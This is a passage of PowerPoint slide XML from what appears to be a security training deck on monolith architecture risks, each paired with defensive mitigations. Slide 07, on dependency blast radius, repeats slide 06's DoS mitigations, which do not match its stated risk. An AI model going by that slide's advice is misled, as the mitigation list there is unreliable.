                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>one primary database</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>. </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Scale is usually “vertical” (bigger box) or “N copies of the same whole thing” behind a load balancer.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2114560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076E-8BE7-D8FA-4179-0FA962CA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7D546-1012-AF3D-6AC3-1FC88504551C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Monolith Security Concerns 01</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8BECD395-FECE-F82D-04B2-029186C5AA80}"/>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t>Fewer trust boundaries</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Risk:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> A single RCE or SQLi often gives the attacker in-process access to everything (functions, ORM, caches).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Split web, workers, and admin into separate processes/containers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Run each under distinct users</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Enable OS sandboxing (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>AppArmor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>SELinux</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Read-only root filesystem; drop Linux capabilities; no root user</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Egress allow-list + network policies between components</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2396054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2C8DF-D1EB-EEDC-23BB-9B618984E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94E1C-6F5E-2C7F-6FFB-900B85024C2E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Monolith Security Concerns 02</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C95A2FDD-229B-7338-67B5-F4839A428173}"/>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Shared credentials and secrets</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Risk:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> Compromising the app host or env vars leaks </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" i="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>ALL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> DB/API keys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Use a secrets manager</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Scope secrets per component/service account</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Rotate regularly</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Prefer short-lived tokens (OIDC/IAM roles)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Keep secrets out of code, images, and long-lived env vars entirely</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2910408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7B316-E8E9-726D-B82E-FA19CEC13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4DC72-26CA-FB36-A9B9-6261170DE2BF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Monolith Security Concerns 03</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3C67D851-5155-9DCB-2930-2894FE6D2497}"/>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Broad permissions</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Risk:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> One service account/IAM role commonly has wide rights across data stores and cloud APIs, enabling lateral impact.</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Enforce least-privilege IAM/RBAC per component; separate service accounts</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Use scoped tokens and permission boundaries</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Deny-by-default policies</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Review/attest permissions regularly</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3807341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12561-19AF-4F6B-E869-14AAF78B0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B2D70-9CF5-0B82-FD3A-C34215219B5C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Monolith Security Concerns 04</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{41F85D48-FF4D-B90B-D6E0-22AC08D7CC06}"/>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a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Broad-scoped Data Access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Risk:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> A single app role often has broad read/write; one injection or logic bug can expose/alter large data sets.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Mitigations:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Multiple DB roles with least privilege per subsystem</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Parameterized queries and strong input validation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Row/column-level controls where feasible</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="27532352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12C6-4826-569D-FD52-5F5901002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8B492-CF27-A921-69A5-2140669A80ED}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Monolith Security Concerns 05</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E9D0D2E0-FD82-523F-CD29-BDD6C5819ECE}"/>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Flat internal network &amp; weak isolation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Risk:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> “Trusted” internal calls mean once inside an intruder can reach admin paths, internal APIs, or data stores.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Mitigations:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Segment networks; apply zero-trust/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>mTLS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> for internal calls</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Strict ingress/egress controls; deny-by-default firewall rules</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Separate admin interfaces behind stronger auth and network boundaries</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Apply per-component rate limits and authentication, even internally</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8656377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853E9-A6FB-97B6-154B-85FDBEBBA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12C71-F893-D1EA-43AF-8027EA54ADCB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Monolith Security Concerns 06</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DEC7F394-5319-248D-AC4E-65765A5CCC21}"/>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DoS coupling &amp; resource contention</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Risk:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> Hot endpoints, heavy jobs, or memory leaks can starve the whole app; an attack (or bug) in one area degrades everything.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Mitigations:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Isolate background jobs into separate workers/queues</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Apply per-endpoint rate limits, timeouts, and circuit breakers</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Set CPU/memory limits; use back-pressure and bulkheads</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Cache carefully with limits to avoid amplification</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="38904400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46AF7-C7EA-EF8B-8D68-A31AC2688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F9380-D97D-C303-5F10-4622B037DB6D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Monolith Security Concerns 07</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{38D184BC-2E78-DA9F-1048-43B00C66684E}"/>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Deployment &amp; dependency blast radius</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Risk:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> One vulnerable dependency or misconfiguration can affect the entire codebase; patching is all-or-nothing and risky</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Mitigations:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Isolate background jobs into separate workers/queues</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Apply per-endpoint rate limits, timeouts, and circuit breakers</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Set CPU/memory limits; use back-pressure and bulkheads</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Cache carefully with limits to avoid amplification</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="32162344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BAB6C-4D3B-F545-ED07-F5A6D24EB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B397A-DE2E-B9EF-B4F7-A46386314CB2}"/>
              </a:ext>
            </a:extLst>
